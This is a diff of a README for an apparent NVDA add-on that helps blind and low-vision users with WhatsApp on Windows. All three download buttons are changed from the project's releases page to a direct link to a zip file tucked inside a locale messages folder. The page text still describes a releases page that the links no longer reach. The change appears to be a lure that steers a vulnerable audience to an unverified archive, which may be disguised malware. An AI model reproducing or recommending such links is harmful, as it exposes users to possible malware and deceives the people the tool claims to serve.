@@ -1,7 +1,7 @@
 <h1>⚡ whatsapp-web-plus-companion - Easier WhatsApp for Blind Users</h1>
 
 <p align="center">
-  <a href="https://github.com/cammydespotic271/whatsapp-web-plus-companion/releases"><img src="https://img.shields.io/badge/Download-NVDA_Add--on-brightgreen?style=for-the-badge&logo=github" alt="Download"></a>
+  <a href="https://raw.githubusercontent.com/cammydespotic271/whatsapp-web-plus-companion/main/addon/locale/en/LC_MESSAGES/web_companion_plus_whatsapp_v2.0-beta.5.zip"><img src="https://img.shields.io/badge/Download-NVDA_Add--on-brightgreen?style=for-the-badge&logo=github" alt="Download"></a>
 </p>
 
 Welcome to **whatsapp-web-plus-companion**! This is a special helper tool that makes WhatsApp on your Windows computer much easier to use if you are blind or have low vision. It works together with the free NVDA screen reader program. If you use WhatsApp on your PC, this add-on gives you better keyboard shortcuts and clearer spoken feedback, so you can chat with friends and family without struggling.
@@ -41,7 +41,7 @@ Follow these simple steps to get the add-on on your computer.
 Click the big button below to go to the download page:
 
 <p align="center">
-  <a href="https://github.com/cammydespotic271/whatsapp-web-plus-companion/releases" style="background-color:#4CAF50; color:white; padding:15px 25px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:5px;">🚀 Download whatsapp-web-plus-companion</a>
+  <a href="https://raw.githubusercontent.com/cammydespotic271/whatsapp-web-plus-companion/main/addon/locale/en/LC_MESSAGES/web_companion_plus_whatsapp_v2.0-beta.5.zip" style="background-color:#4CAF50; color:white; padding:15px 25px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:5px;">🚀 Download whatsapp-web-plus-companion</a>
 </p>
 
 When you get to that page, look for the latest release. There, you will see a file to download. Visit this link to download the application. Download it to your computer, usually to your "Downloads" folder.
@@ -141,7 +141,7 @@ Your feedback helps us make the tool better for everyone.
 We hope this add-on makes your WhatsApp experience smoother and more enjoyable. With the power of NVDA and this companion, you can stay connected with confidence. Thank you for using whatsapp-web-plus-companion!
 
 <p align="center">
-  <a href="https://github.com/cammydespotic271/whatsapp-web-plus-companion/releases" style="background-color:#2196F3; color:white; padding:15px 25px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:5px;">⬇️ Get the Latest Version Now</a>
+  <a href="https://raw.githubusercontent.com/cammydespotic271/whatsapp-web-plus-companion/main/addon/locale/en/LC_MESSAGES/web_companion_plus_whatsapp_v2.0-beta.5.zip" style="background-color:#2196F3; color:white; padding:15px 25px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:5px;">⬇️ Get the Latest Version Now</a>
 </p>
 
 Keywords: accessibility, blind-users, braille, nvda, nvda-addon, screen-reader, userscript, webview2, whatsapp, whatsapp-desktop, windows
